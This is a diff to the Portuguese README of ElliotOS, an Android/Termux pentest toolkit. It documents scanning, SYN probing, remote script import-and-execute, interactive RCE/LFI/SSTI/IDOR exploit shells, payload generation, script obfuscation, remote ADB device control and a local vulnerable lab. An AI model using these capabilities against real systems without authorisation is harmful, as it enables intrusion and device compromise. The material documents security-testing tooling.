@@ -22,6 +22,57 @@
 
 ---
 
+## Índice
+
+- [O que é o ElliotOS?](#o-que-é-o-elliotos)
+- [Plataformas e arquiteturas](#plataformas-suportadas)
+- [Instalação](#instalação)
+- [Ferramentas incluídas](#ferramentas-incluídas)
+- [CYN — IA nativa](#cyn--ia-nativa)
+- [ms — Referência de flags](#ms--referência-de-flags)
+- [Comandos especiais do REPL](#comandos-especiais-do-repl)
+- [Módulos da API](#módulos-da-api-globais-no-repl--nunca-use-require)
+  - [net.\*](#net--rede)
+  - [mod.\*](#mod--pentest-scanners)
+  - [exploit.\*](#exploit--repls-de-pós-exploração-interativa)
+  - [sys.\*](#sys--sistema-e-threads)
+  - [crypto.\*](#crypto--criptografia-openssl)
+  - [fs.\*](#fs--filesystem)
+  - [db.\*](#db--sqlite3-embutido)
+  - [ai.\*](#ai--interface-com-a-cyn)
+  - [web.\*](#web--parsing-html-e-servidor-web)
+  - [dow.\*](#dow--download-de-mídia)
+  - [sh.\*](#sh--shell-direto)
+  - [pent.\*](#pent--lab-local-vulnerável)
+  - [lmod.\*](#lmod--criador-de-módulos-lua)
+  - [cc.\*](#cc--compilador-c-inline-e-transpilador-lua--c)
+  - [adb.\*](#adb--android-debug-bridge-via-wi-fi)
+  - [ui.\*](#ui--interface-de-terminal)
+  - [tui.\*](#tui--framework-de-ui-de-terminal-interativo)
+  - [ell.\*](#ell--encoderdecoder-de-scripts)
+  - [agent.\*](#agent--agente-autônomo)
+  - [ivar.\* ⚡ ATUALIZADO](#ivar--variáveis-indexadas-v20--atualizado)
+  - [ms.\*](#ms--utilitários-do-sistema)
+  - [string.\*](#string--extensões-de-string)
+  - [util.\*](#util--stdlib-funcional)
+  - [json.\*](#json--json-nativo)
+  - [back(), lg(), ic()](#back--saída-temporária-para-bash)
+- [net.import — atualizado](#netimport--atualizado)
+- [xtun — Tunnel Toolkit](#xtun--tunnel-toolkit)
+- [appforge — HTML/CSS/JS para APK](#appforge--htmlcssjs-para-apk)
+- [ms -ba — Arch Linux ARM + BlackArch](#ms--ba--arch-linux-arm--blackarch)
+- [XPM — Gerenciador de Pentest](#xpm--gerenciador-de-pentest)
+- [LPM — Gerenciador de Pacotes Lua](#lpm--gerenciador-de-pacotes-lua)
+- [Scripts de exemplo](#scripts-de-exemplo)
+- [Documentação e aprendizado](#documentação-e-aprendizado)
+- [Interface Gráfica (opcional)](#interface-gráfica-opcional)
+- [Estrutura do projeto](#estrutura-do-projeto)
+- [Requisitos de hardware](#requisitos-de-hardware)
+- [Autor](#autor)
+- [Licença](#licença)
+
+---
+
 ## O que é o ElliotOS?
 
 O ElliotOS é um sistema operacional de segurança e pentest construído **dentro do Termux**, o emulador de terminal do Android. Desenvolvido por **Mike Elliot**, nasceu de uma necessidade real: não existia nenhum toolkit de pentest funcional para Android.
@@ -90,71 +141,36 @@ cd ElliotOS
 bash luascript.sh
 ```
 
----
-
 ### Com editor — ElliotOS + ElliotOS Editor
 
-Tudo do modo mínimo + editor de texto nativo (`ms -e`).
-
 ```bash
-pkg update -y && pkg install -y git wget curl clang
-git clone https://github.com/mikeelliot218/ElliotOS.git
-cd ElliotOS
 bash luascript.sh -e
 ```
 
----
-
 ### Com GUI — ElliotOS + XFCE4 (Termux:X11)
 
-Tudo do modo mínimo + ambiente gráfico XFCE4. Sem editor.
-
 ```bash
-pkg update -y && pkg install -y git wget curl clang
-git clone https://github.com/mikeelliot218/ElliotOS.git
-cd ElliotOS
 bash luascript.sh --gui
 ```
 
----
-
 ### Full — ElliotOS + Editor + GUI
 
-Instalação completa: sistema + editor + XFCE4.
-
 ```bash
-pkg update -y && pkg install -y git wget curl clang
-git clone https://github.com/mikeelliot218/ElliotOS.git
-cd ElliotOS
 bash luascript.sh -e --gui
 ```
 
----
-
-### Atualizar — já tem o ElliotOS instalado?
-
-Recompila o binário e atualiza os scripts sem reinstalar dependências.
+### Atualizar
 
 ```bash
-pkg update -y && pkg install -y git wget curl clang
-git clone https://github.com/mikeelliot218/ElliotOS.git
-cd ElliotOS
 bash luascript.sh --update
 ```
-
----
 
 ### Desinstalar
 
 ```bash
-# Remove apenas o ElliotOS (mantém clang, curl, openssl...)
-bash luascript.sh -u
-
-# Remove ElliotOS + todas as dependências do sistema
-bash luascript.sh -ua
+bash luascript.sh -u     # mantém dependências
+bash luascript.sh -ua    # remove tudo
 ```
-
----
 
 ### Diagnóstico pós-instalação
 
@@ -162,15 +178,7 @@ bash luascript.sh -ua
 bash luascript.sh --doctor
 ```
 
-Verifica o estado da instalação atual e reporta problemas sem recompilar nada.
-
----
-
 ### Todas as flags do instalador
-
-```
-bash luascript.sh [ambiente] [opções]
-```
 
 | Flag | Descrição |
 |------|-----------|
@@ -188,18 +196,6 @@ bash luascript.sh [ambiente] [opções]
 | `-h` / `--help` | Exibe ajuda completa |
 
 > A instalação compila tudo do zero e leva cerca de **15 a 20 minutos** dependendo do dispositivo. Nenhuma etapa exige root.
-
----
-
-### Dependências instaladas automaticamente
-
-**Termux:** `wget`, `timg`, `which`, `binutils`, `git`, `make`, `cmake`, `build-essential`, `clang`, `figlet`, `tree`, `readline`, `curl`, `libcurl`, `libssh2`, `openssl`, `openssl-tool`, `autoconf`, `whois`, `ncurses`, `nmap`, `file`, `libsqlite`, `sqlite`, `nodejs`, `tgpt`
-
-**Debian/Ubuntu:** `build-essential`, `clang`, `wget`, `git`, `make`, `cmake`, `libreadline-dev`, `libcurl4-openssl-dev`, `libssl-dev`, `libncurses-dev`, `figlet`, `whois`, `curl`, `nmap`, `file`, `libsqlite3-dev`, `sqlite3`, `nodejs`, `tgpt`
-
-**Arch:** `base-devel`, `clang`, `wget`, `git`, `cmake`, `readline`, `curl`, `openssl`, `ncurses`, `figlet`, `whois`, `nmap`, `file`, `sqlite`, `nodejs`, `tgpt`
-
-**Fedora:** `gcc`, `clang`, `make`, `cmake`, `wget`, `git`, `readline-devel`, `libcurl-devel`, `openssl-devel`, `ncurses-devel`, `figlet`, `whois`, `curl`, `nmap`, `file`, `sqlite-devel`, `sqlite`, `nodejs`, `tgpt`
 
 ---
 
@@ -222,7 +218,7 @@ bash luascript.sh [ambiente] [opções]
 
 ## CYN — IA nativa
 
-```
+```bash
 ms -a
 ```
 
@@ -371,12 +367,6 @@ ms --script nome              # executa script Lua ou C do diretório de scripts
 ms --script nome -- [args]    # com argumentos
 ms --cscript nome.c           # compila e executa script C
 ms --cscript binario          # executa binário C já compilado
-
-# Exemplos:
-ms --script recon -- alvo.com
-ms --script portscan -- 192.168.1.1 1 9999 32
-ms --script webcheck -- https://alvo.com
-ms --script nexus -- --recon 192.168.1.1 -p 22,80,443
 ```
 
 **Aprender / Documentação**
@@ -437,41 +427,116 @@ Todos os módulos abaixo são objetos globais disponíveis automaticamente no RE
 ### `net.*` — Rede
 
 ```lua
-net.get(url [,{headers,timeout,proxy}])            -- HTTP GET → {code, body, headers}
+-- HTTP
+net.get(url [,{headers,timeout,proxy}])            -- GET → body
 net.geth(url [,opts])                              -- GET retornando só os headers
-net.post(url, body [,opts])                        -- HTTP POST
-net.fetch(url [,opts])                             -- alias de get com controle fino
-net.import(url)                                    -- baixa e executa Lua remoto → true/false
-net.tcp(host, port)                                -- socket TCP OO → obj:send/:recv/:close/:lines
-net.tcp6(host, port)                               -- socket TCP IPv6
-net.udp(host, port)                                -- socket UDP
-net.connect(host, port)                            -- alias de tcp
-net.listen(port, fn)                               -- servidor TCP
-net.socket(fam, type, host, port, timeout, payload)-- socket raw fire-and-forget
-net.socketex(fam, type, host, port [,t])           -- socket OO; type='syn' → SYN probe sem root
-net.scan(host, p1, p2 [,threads])                  -- port scan SYN sem root → {port, status, ms, open}
-net.ping(host)                                     -- retorna latência em ms ou nil
-net.dns(host)                                      -- DNS lookup → tabela de IPs
-net.os(host)                                       -- OS fingerprint sem root → {os, ttl, confidence}
-net.ip()                                           -- hosts ativos na rede local (auto-detecta subnet)
-net.ip('192.168.1')                                -- scan da subnet especificada
-net.ip('cidr', sec)                                -- com timeout em segundos (padrão: 1s, max: 5s)
-net.send(fd, data)                                 -- envia dados por fd
-net.recv(fd [,size])                               -- recebe dados por fd
-net.close(fd)                                      -- fecha conexão por fd
-net.help()                                         -- ajuda do módulo
+net.post(url, body [,opts])                        -- POST → body, code
+net.fetch(url [,opts])                             -- GET com controle fino → body, code, headers_raw
+
+-- Import remoto (veja seção dedicada abaixo)
+net.import(url [,mode])                            -- baixa e executa script remoto
+                                                   -- mode 0 (padrão): executa com ms -f (ElliotOS)
+                                                   -- mode 1: executa como Lua puro via luar
+
+-- Sockets OO
+net.tcp(host, port [,timeout])                     -- socket TCP IPv4 → SockObj
+net.tcp6(host, port [,timeout])                    -- socket TCP IPv6 → SockObj
+net.udp(host, port [,timeout])                     -- socket UDP → SockObj
+net.connect(host, port [,timeout])                 -- alias de tcp
+net.listen(port [,host [,backlog]])                -- servidor TCP → SockObj
+net.socketex(fam, type, host, port [,t])           -- socket OO completo; type='syn' → SYN probe → tabela
+
+-- Fire-and-forget
+net.socket(fam, type, host, port [,timeout [,payload]])
+-- fam: "ipv4"|"ipv6" / type: "stream"|"tcp"|"dgram"|"udp"|"syn"
+-- retorna resposta ou "[SYN] host:port → open|closed|filtered (+Xms)"
+
+-- SYN probe dedicado
+net.syn(host, port [,timeout [,family]])
+net.syn({host=, port= [,timeout=] [,family=] [,verbose=]})
+-- retorna tabela: {status, host, port, ms, open, family}
+
+-- Reconhecimento
+net.scan(host, p1, p2 [,threads])                  -- SYN scan sem root → [{port, status, ms, open}, ...]
+net.ping(host)                                     -- latência em ms ou nil
+net.dns(host [,tipo])                              -- DNS lookup ('A','AAAA','ANY') → tabela de IPs
+net.os(host)                                       -- OS fingerprint sem root → {host,ip,ttl,os_hint,type,ports,server,confidence}
+net.ip([cidr [,timeout]])                          -- host discovery na rede local → tabela de IPs ativos
+
+-- Legacy (fd numérico — preferir métodos do objeto)
+net.send(fd, data)
+net.recv(fd [,size])
+net.close(fd)
+
+net.help()
 ```
 
 **Objeto socket (retornado por `net.tcp`, `net.socketex`):**
 ```lua
-s:send(data)         s:sendall(data)     s:sendto(data, host, port)
-s:recv([size])       s:recvall()         s:recvline()
-s:recvfrom()         s:peek([size])      s:lines()
-s:wait([timeout])    s:bind(host, port)  s:accept()
-s:shutdown([how])    s:settimeout(ms)    s:setsockopt(level, opt, val)
-s:getsockopt(level, opt)                 s:local()
-s:peer()             s:fd()              s:closed()
-s:close()            s:info()
+-- Envio
+s:send(data)              s:sendall(data)           s:sendto(data, host, port)
+
+-- Recepção
+s:recv([max])             s:recvall([max])           s:recvline()
+s:recvfrom([max])         s:peek([max])
+for ln in s:lines() do    -- iterator de linhas
+
+-- Controle
+s:wait([timeout])         s:settimeout(sec)          s:bind(ip, port)
+s:shutdown("r"|"w"|"rw") s:accept()                 s:close()
+
+-- Opções
+s:setsockopt(level, opt, val)    -- levels: socket | tcp | ip
+s:getsockopt(level, opt)         -- opts: reuseaddr keepalive nodelay rcvbuf sndbuf...
+
+-- Info
+s:info()        -- tabela: host, port, family, type, fd, local_ip, local_port, rcvbuf, sndbuf
+s:local()       -- ip local, porta local
+s:peer()        -- "host:porta" remoto
+s:fd()          -- file descriptor numérico
+s:closed()      -- true/false
+```
+
+**Exemplos:**
+```lua
+-- GET simples
+local body = net.get('http://site.com/')
+
+-- POST com headers customizados
+local r, c = net.post('http://site.com/api', '{"id":1}',
+                       'application/json',
+                       {Authorization='Bearer TOKEN'})
+
+-- DNS lookup
+local ips = net.dns('exemplo.com')
+for _, ip in ipairs(ips) do print(ip) end
+
+-- SYN probe direto
+print(net.socket("ipv4","syn","1.1.1.1",80))
+-- → [SYN] 1.1.1.1:80 → open (+12ms)
+
+-- SYN probe via net.syn → tabela estruturada
+local r = net.syn("alvo.com", 443)
+if r and r.open then print("aberta:", r.ms, "ms") end
+
+-- Port scan completo
+local portas = net.scan('192.168.1.1', 1, 65535)
+for _, p in ipairs(portas) do print('aberta:', p) end
+
+-- Banner grab SSH
+print(net.socket("ipv4","stream","192.168.1.1",22))
+
+-- HTTP manual via socket OO
+local s = net.socketex("ipv4","stream","example.com",80)
+s:sendall("GET / HTTP/1.0\r\nHost: example.com\r\n\r\n")
+print(s:recvall())
+s:close()
+
+-- Servidor TCP
+local srv = net.listen(8080)
+local cli = srv:accept()
+for line in cli:lines() do print(line) end
+cli:close(); srv:close()
 ```
 
 ---
@@ -514,7 +579,7 @@ mod.open_redirect(url)    -- Open Redirect (alias de mod.redir)
 mod.git(url)              -- detecta .git exposto
 mod.chain(url)            -- pipeline automático: spider + classifica + aplica scanners
 mod.payload(tipo)         -- gera payloads para um tipo de vuln
-mod.help()                -- ajuda do módulo
+mod.help()
 ```
 
 > `n` = número de endpoints a testar (padrão: 1; 0 = todos)
@@ -532,7 +597,7 @@ exploit.lfi(url)    -- REPL de LFI — lê arquivos via path traversal
 exploit.rce(url)    -- REPL de RCE — shell interativo via execução remota
 exploit.ssti(url)   -- REPL de SSTI — injeta templates (Jinja2, Twig...)
 exploit.idor(url)   -- REPL de IDOR — fuzzing de IDs para acesso não autorizado
-exploit.help()      -- ajuda do módulo
+exploit.help()
 ```
 
 ---
@@ -551,16 +616,27 @@ sys.env(var)            -- lê variável de ambiente
 sys.env(var, val)       -- seta variável de ambiente
 sys.env()               -- retorna tabela com todas as variáveis
 sys.pid()               -- PID do processo atual
-sys.sleep(s)            -- pausa em segundos (float aceito)
+sys.sleep(s)            -- pausa em segundos (float aceito: sys.sleep(0.5))
 sys.time()              -- epoch em segundos
 sys.time_ms()           -- epoch em milissegundos
 sys.exit(n)             -- encerra com código de saída
-sys.mutex()             -- cria mutex → obj:lock()/:unlock()/:try()/:destroy()
-sys.channel()           -- cria canal → obj:send()/:recv()/:close()/:fd_r()/:fd_w()
+sys.mutex()             -- cria mutex → obj:lock() / :unlock() / :try() / :destroy()
+sys.channel()           -- cria canal → obj:send() / :recv() / :close() / :fd_r() / :fd_w()
 sys.net()               -- info de rede: interfaces, bytes rx/tx, loopback
 sys.storage()           -- info de armazenamento: total, usado, livre
 sys.logo()              -- exibe logo ASCII do ElliotOS
-sys.help()              -- ajuda do módulo
+sys.help()
+```
+
+**Exemplo — threads + canal:**
+```lua
+local ch = sys.channel()
+local t = sys.thread(function()
+    sys.sleep(1)
+    ch:send("pronto")
+end)
+print(ch:recv())   -- "pronto"
+sys.join(t)
 ```
 
 ---
@@ -568,19 +644,19 @@ sys.help()              -- ajuda do módulo
 ### `crypto.*` — Criptografia (OpenSSL)
 
 ```lua
-crypto.md5(s)               -- hash MD5 → hex string
-crypto.sha1(s)              -- hash SHA1 → hex string
-crypto.sha256(s)            -- hash SHA256 → hex string
-crypto.sha512(s)            -- hash SHA512 → hex string
-crypto.hmac(key, data [,algo]) -- HMAC (padrão: SHA256) → hex string
-crypto.aes_enc(key, data)   -- AES-256-CBC encrypt → base64
-crypto.aes_dec(key, data)   -- AES-256-CBC decrypt → plaintext
-crypto.b64enc(s)            -- Base64 encode
-crypto.b64dec(s)            -- Base64 decode
-crypto.hexenc(s)            -- hex encode (bytes → hex string)
-crypto.hexdec(s)            -- hex decode (hex string → bytes)
-crypto.rand(n)              -- n bytes aleatórios (criptograficamente seguros)
-crypto.help()               -- ajuda do módulo
+crypto.md5(s)                   -- hash MD5 → hex string
+crypto.sha1(s)                  -- hash SHA1 → hex string
+crypto.sha256(s)                -- hash SHA256 → hex string
+crypto.sha512(s)                -- hash SHA512 → hex string
+crypto.hmac(key, data [,algo])  -- HMAC (padrão: SHA256) → hex string
+crypto.aes_enc(key, data)       -- AES-256-CBC encrypt → base64
+crypto.aes_dec(key, data)       -- AES-256-CBC decrypt → plaintext
+crypto.b64enc(s)                -- Base64 encode
+crypto.b64dec(s)                -- Base64 decode
+crypto.hexenc(s)                -- hex encode (bytes → hex string)
+crypto.hexdec(s)                -- hex decode (hex string → bytes)
+crypto.rand(n)                  -- n bytes aleatórios (criptograficamente seguros)
+crypto.help()
 ```
 
 ---
@@ -602,7 +678,7 @@ fs.isfile(path)         -- boolean
 fs.chmod(path, mode)    -- muda permissões (mode em octal, ex: 0755)
 fs.list(dir)            -- lista diretório → tabela de nomes
 fs.glob(pattern)        -- glob → tabela de caminhos (ex: fs.glob('*.lua'))
-fs.help()               -- ajuda do módulo
+fs.help()
 ```
 
 ---
@@ -615,7 +691,7 @@ db.close()              -- fecha o banco atual
 db.exec(sql)            -- executa DDL/DML sem retorno (CREATE, INSERT, UPDATE, DELETE)
 db.query(sql)           -- SELECT → tabela Lua [{col=val,...}, ...]
 db.tables()             -- lista tabelas do banco atual
-db.help()               -- ajuda do módulo
+db.help()
 ```
 
 **Exemplo:**
@@ -647,7 +723,7 @@ ai.raw_mode(bool)               -- ativa/desativa output raw (sem markdown)
 ai.history()                    -- exibe histórico da conversa atual
 ai.forget()                     -- remove última troca do histórico
 ai.clear()                      -- limpa todo o histórico de conversa
-ai.help()                       -- ajuda do módulo
+ai.help()
 ```
 
 ---
@@ -664,7 +740,7 @@ web.forms(html)              -- extrai <form> com action, method, inputs → tab
 web.scripts(html)            -- extrai <script> externos e inline → tabela
 web.serve(path, port [,opts])-- sobe servidor HTTP estático em background
 web.stop()                   -- para o servidor iniciado por web.serve()
-web.help()                   -- ajuda do módulo
+web.help()
 ```
 
 ---
@@ -680,7 +756,7 @@ dow.imagen(url)     -- baixa imagem via URL direta com wget
 dow.playlist(url)   -- baixa playlist completa do YouTube via yt-dlp
 dow.info(url)       -- status das ferramentas e instância Cobalt em uso
 dow.reset()         -- troca instância Cobalt em cache (útil se a atual falhar)
-dow.help()          -- ajuda do módulo
+dow.help()
 ```
 
 > YouTube requer: `pkg install python-yt-dlp`
@@ -693,7 +769,7 @@ dow.help()          -- ajuda do módulo
 sh.exec(cmd)      -- executa comando e retorna stdout como string
 sh.read(cmd)      -- alias de exec
 sh.capture(cmd)   -- alias de exec (usado internamente pelo ms --sh)
-sh.help()         -- ajuda do módulo
+sh.help()
 ```
 
 > Para capturar stderr: `sh.exec('comando 2>&1')`
@@ -709,14 +785,14 @@ pent.start(level, port) -- sobe lab (level: 'easy', 'med' ou 'hard')
 pent.stop()             -- para todos os labs
 pent.status()           -- status dos labs rodando
 pent.list()             -- lista labs disponíveis com descrição
-pent.help()             -- ajuda do módulo
+pent.help()
 ```
 
 Portas padrão: `8081` (easy), `8082` (med), `8083` (hard).
 
-Endpoints disponíveis: `/search`, `/login`, `/xss`, `/comment`, `/dom`, `/exec`, `/file`, `/path`, `/note`, `/tpl`, `/upload`, `/api/users`, `/api/me`, `/api/users/login`, `/api/products`, `/api/search`, `/redirect`, `/cors`, `/csrf`, `/jwt`, `/xxe`, `/admin`, `/register`, `/reset`, `/debug`, `/backup`, `/ssrf`, `/serialize`, `/rate`, `/headers`
+**Endpoints disponíveis:** `/search`, `/login`, `/xss`, `/comment`, `/dom`, `/exec`, `/file`, `/path`, `/note`, `/tpl`, `/upload`, `/api/users`, `/api/me`, `/api/users/login`, `/api/products`, `/api/search`, `/redirect`, `/cors`, `/csrf`, `/jwt`, `/xxe`, `/admin`, `/register`, `/reset`, `/debug`, `/backup`, `/ssrf`, `/serialize`, `/rate`, `/headers`
 
-Flags de exemplo: `FLAG{easy_sqli_win}`, `FLAG{nosql_auth_bypass}`, `FLAG{jwt_none_attack}`, `FLAG{lfi_found_you}`, `FLAG{ssrf_internal_fetch}`
+**Flags de exemplo:** `FLAG{easy_sqli_win}`, `FLAG{nosql_auth_bypass}`, `FLAG{jwt_none_attack}`, `FLAG{lfi_found_you}`, `FLAG{ssrf_internal_fetch}`
 
 ---
 
@@ -729,12 +805,10 @@ lmod.mod('arquivo.lua')    -- copia/registra arquivo Lua existente como módulo
 lmod.list()                -- lista módulos instalados em ~/.lua-modules
 lmod.remove('nome')        -- remove módulo pelo nome
 lmod.path()                -- mostra o diretório de módulos
-lmod.help()                -- ajuda com exemplos de uso
+lmod.help()
 ```
 
 Módulos criados com `lmod` são carregados via `require('nome')` nos scripts.
-
-**Tipos de template:**
 
 | Tipo | Descrição |
 |------|-----------|
@@ -750,10 +824,8 @@ Módulos criados com `lmod` são carregados via `require('nome')` nos scripts.
 ```lua
 cc.run(codigo_c)        -- compila e executa código C direto do REPL
 cc.lua2c(arquivo_lua)   -- transpila arquivo Lua para C (gera arquivo.c)
-cc.help()               -- ajuda do módulo
+cc.help()
 ```
-
-O transpilador `cc.lua2c` cobre Lua 5.4: funções named/locais/anônimas, retorno múltiplo, tabelas como arrays C, inferência de tipo (`int`/`double`/`char[]`/`const char*`), e forward declarations automáticas.
 
 ```lua
 -- Exemplo cc.run:
@@ -778,7 +850,6 @@ Usa o binário `adb` do Termux. Funciona sem root via protocolo ADB over TCP.
 ```lua
 -- Conexão
 adb.pair('ip:porta', 'codigo')      -- pareia via Wi-Fi (Android 11+)
-                                     -- código em: Config → Desenvolvedor → Pareamento por código
 adb.connect('ip:porta')             -- conecta ao dispositivo após pareamento
 adb.disconnect()                    -- desconecta
 adb.devices()                       -- lista dispositivos conectados
@@ -796,7 +867,7 @@ adb.logcat([filtro])                -- lê logcat (opcional: filtro de tag)
 -- Controle do device
 adb.tap(x, y)                       -- simula toque na tela
 adb.swipe(x1, y1, x2, y2)          -- simula gesto de swipe
-adb.keyevent(code)                  -- envia evento de tecla (ex: 3 = HOME, 4 = BACK)
+adb.keyevent(code)                  -- envia evento de tecla (3=HOME, 4=BACK)
 adb.text('texto')                   -- digita texto via ADB
 adb.screenshot()                    -- captura tela → salva em ~/Downloads/
 adb.reboot(['recovery'|'fastboot']) -- reinicia o device
@@ -812,8 +883,7 @@ adb.overscan(t, r, b, l)           -- ajusta overscan da tela
 adb.game_mode(bool)                 -- ativa/desativa modo game
 adb.forward(lport, rport)           -- port forwarding device → host
 adb.setup()                         -- configura ambiente ADB
-
-adb.help()                          -- ajuda do módulo
+adb.help()
 ```
 
 **Fluxo típico (Android 11+):**
@@ -837,10 +907,8 @@ ui.clear()             -- limpa a tela
 ui.sleep(s)            -- pausa em segundos
 ui.fig(texto)          -- ASCII art via figlet
 ui.input([prompt])     -- lê linha do usuário → string
-ui.help()              -- ajuda do módulo
+ui.help()
 ```
-
-**Códigos de cor comuns:**
 
 | Código | Resultado |
 |--------|-----------|
@@ -860,22 +928,22 @@ tui.main()        -- inicia loop principal de UI (bloqueante)
 tui.func(fn)      -- registra função de callback (chamada a cada iteração)
 tui.close()       -- encerra o loop de UI
 tui.read()        -- lê evento de teclado raw
-tui.help()        -- ajuda do módulo
+tui.help()
 ```
 
 **Exemplo completo:**
 ```lua
 tui.func(function()
-  ui.clear()
-  ui.fig('Menu')
-  local op = ui.input('Escolha [1-3, q]: ')
-  if op == '1' then
-    print(net.get('https://ifconfig.me'))
-  elseif op == '2' then
-    mod.headers('https://alvo.com')
-  elseif op == 'q' then
-    tui.close()
-  end
+    ui.clear()
+    ui.fig('Menu')
+    local op = ui.input('Escolha [1-3, q]: ')
+    if op == '1' then
+        print(net.get('https://ifconfig.me'))
+    elseif op == '2' then
+        mod.headers('https://alvo.com')
+    elseif op == 'q' then
+        tui.close()
+    end
 end)
 tui.main()
 ```
@@ -887,13 +955,13 @@ tui.main()
 Codifica scripts Lua/Python/C/Bash/JS em formato `.ell` (3 camadas de ofuscação). Útil para distribuir scripts sem expor o código-fonte.
 
 ```lua
-ell.encode('script.lua')            -- gera script.ell
-ell.encode('script.py', 'python')   -- força linguagem explícita
-ell.encode('script.lua', nil, 'saida.ell') -- especifica arquivo de saída
-ell.decode('script.ell')            -- restaura o arquivo original
-ell.encode_str(code, 'lua')         -- codifica string em memória → string .ell
-ell.decode_str(data)                -- decodifica string .ell → código original
-ell.help()                          -- ajuda do módulo
+ell.encode('script.lua')                       -- gera script.ell
+ell.encode('script.py', 'python')              -- força linguagem explícita
+ell.encode('script.lua', nil, 'saida.ell')    -- especifica arquivo de saída
+ell.decode('script.ell')                       -- restaura o arquivo original
+ell.encode_str(code, 'lua')                    -- codifica string em memória → string .ell
+ell.decode_str(data)                           -- decodifica string .ell → código original
+ell.help()
 ```
 
 ---
@@ -903,14 +971,14 @@ ell.help()                          -- ajuda do módulo
 Agente que usa a CYN para escrever código, executar, ver o erro, corrigir e iterar automaticamente.
 
 ```lua
-agent.run('tarefa' [, opts])   -- executa tarefa em loop (opts: {auto=true, lang='lua'|'c'|'bash', max=N})
+agent.run('tarefa' [, opts])   -- executa tarefa em loop
+                                -- opts: {auto=true, lang='lua'|'c'|'bash', max=N}
 agent.chat('msg')              -- conversa livre sem execução de código
 agent.reset()                  -- limpa o contexto/histórico do agente
-agent.help()                   -- ajuda do módulo
+agent.help()
 ```
 
 ```lua
--- Exemplos:
 agent.run('faça um servidor HTTP em Lua', {auto=true})
 agent.run('crie um port scanner em bash')
 agent.chat('como funciona heap spray?')
@@ -918,52 +986,112 @@ agent.chat('como funciona heap spray?')
 
 ---
 
-### `ivar.*` — Variáveis indexadas (v2.0)
+### `ivar.*` — Variáveis indexadas v2.0 ⚡ ATUALIZADO
 
-Toda variável declarada recebe automaticamente um índice `!N`, permitindo referenciá-la pelo número em vez do nome completo. Ideal para nomes longos em projetos sérios, UIs e jogos. **Ativado por padrão desde a instalação.**
+O `ivar` é o sistema de **variáveis indexadas** do ElliotOS. Toda variável declarada recebe automaticamente um índice `!N`, permitindo referenciá-la pelo número em vez do nome completo — excelente para nomes longos em projetos sérios, UIs e jogos. **Ativado por padrão desde a instalação.**
 
 ```lua
-ivar.enable()          -- ativa (padrão)
-ivar.disable()         -- desativa
-ivar.status()          -- status + vars, escopos e aliases
-ivar.list()            -- mapa !N → nome = valor_atual
-ivar.alias("hp", "player_health_percentage")  -- registra !hp → variável
-ivar.alias()           -- lista todos os aliases
-ivar.debug(true)       -- avisa em stderr ao registrar cada variável
-ivar.reset()           -- limpa índices, aliases e pilha de escopos
-ivar.preprocess(code)  -- pré-processa string substituindo !N e !alias
-ivar.help()            -- ajuda rápida
+ivar.enable()                                    -- ativa (padrão)
+ivar.disable()                                   -- desativa
+ivar.status()                                    -- status + vars, escopos e aliases
+ivar.list()                                      -- mapa !N → nome = valor_atual
+ivar.alias("hp", "player_health_percentage")     -- registra !hp → variável
+ivar.alias()                                     -- lista todos os aliases
+ivar.debug(true)                                 -- avisa em stderr ao registrar cada variável
+ivar.reset()                                     -- limpa índices, aliases e pilha de escopos
+ivar.preprocess(code)                            -- pré-processa string substituindo !N e !alias
+ivar.help()
 ```
 
-**Índices numéricos:**
+#### `!N` — Índices numéricos (escopo global)
+
+Cada variável declarada no escopo global recebe um índice sequencial. Use `!N` em qualquer expressão para expandir para o nome completo:
+
 ```lua
 nome_longo_aqui = "Mike"   -- !1 → nome_longo_aqui
 player_score    = 9800     -- !2 → player_score
-print(!1, !2)              -- print(nome_longo_aqui, player_score)
-ivar.list()                -- !1 → nome_longo_aqui = "Mike" | !2 → player_score = 9800
+server_response = {}       -- !3 → server_response
+
+print(!1, !2)              -- equivale a: print(nome_longo_aqui, player_score)
+!3["status"] = 200         -- equivale a: server_response["status"] = 200
+
+ivar.list()
+-- !1 → nome_longo_aqui   = "Mike"
+-- !2 → player_score      = 9800
+-- !3 → server_response   = table
 ```
 
-**Aliases nomeados** — a linha `!alias = varname` é interceptada pelo pré-processador e não chega ao Lua:
+#### `!!N` — Acesso a variáveis fora do escopo atual ⚡ NOVO
+
+Dentro de funções, o índice `!N` reinicia do 1. Para acessar variáveis do escopo **externo** (global ou de um escopo pai), use `!!N` com dois pontos de exclamação:
+
 ```lua
-player_health_percentage = 100
-!hp = player_health_percentage   -- registra alias (linha some do código)
-print(!hp)                        -- expande para player_health_percentage
+dano_global    = 50        -- !1 no escopo global
+multiplicador  = 3         -- !2 no escopo global
+
+function calcular()
+    bonus = 10             -- !1 neste escopo (local à função)
+    local total = !!1 * !!2 + !1
+    -- !!1 → dano_global (escopo externo)
+    -- !!2 → multiplicador (escopo externo)
+    -- !1  → bonus (escopo atual)
+    return total           -- 50 * 3 + 10 = 160
+end
+
+print(calcular())  -- 160
 ```
 
-**Escopo por função** — dentro de cada `function`, `!1` reinicia do zero:
+> **Regra:** `!N` sempre resolve no escopo atual (função corrente). `!!N` sempre sobe um nível e resolve no escopo pai (global ou escopo envolvente).
+
 ```lua
-function ataque()
-    dano_base    = 10   -- !1 neste escopo
-    multiplicador = 2   -- !2 neste escopo
-    return !1 * !2      -- return dano_base * multiplicador
+-- Exemplo prático: função com variáveis internas e externas
+config_timeout = 30        -- !!1 de dentro da função
+config_retries = 5         -- !!2 de dentro da função
+
+function connect(host)
+    socket = net.tcp(host, 80)   -- !1 dentro de connect
+    socket:settimeout(!!1)       -- usa config_timeout (escopo externo)
+    for i = 1, !!2 do            -- usa config_retries (escopo externo)
+        if !1:wait() then break end
+    end
+    return !1                    -- retorna socket
 end
 ```
 
-**Modo debug:**
+#### Aliases nomeados
+
+A linha `!alias = varname` é interceptada pelo pré-processador e não chega ao parser Lua:
+
 ```lua
-ivar.debug(true)   -- ativa
-x = 10             -- stderr: [ivar:debug] !1 → x
-ivar.debug(false)  -- desativa
+player_health_percentage = 100
+!hp = player_health_percentage   -- registra alias (linha some do código gerado)
+print(!hp)                        -- expande para: print(player_health_percentage)
+!hp = !hp - 10                   -- player_health_percentage = player_health_percentage - 10
+```
+
+#### Escopo por função — `!N` reinicia dentro de cada função
+
+```lua
+function ataque()
+    dano_base     = 10    -- !1 neste escopo
+    multiplicador = 2     -- !2 neste escopo
+    return !1 * !2        -- return dano_base * multiplicador → 20
+end
+
+function defesa()
+    armadura = 5          -- !1 neste escopo (diferente do !1 de ataque)
+    reducao  = 0.3        -- !2 neste escopo
+    return !1 * !2        -- return armadura * reducao → 1.5
+end
+```
+
+#### Modo debug
+
+```lua
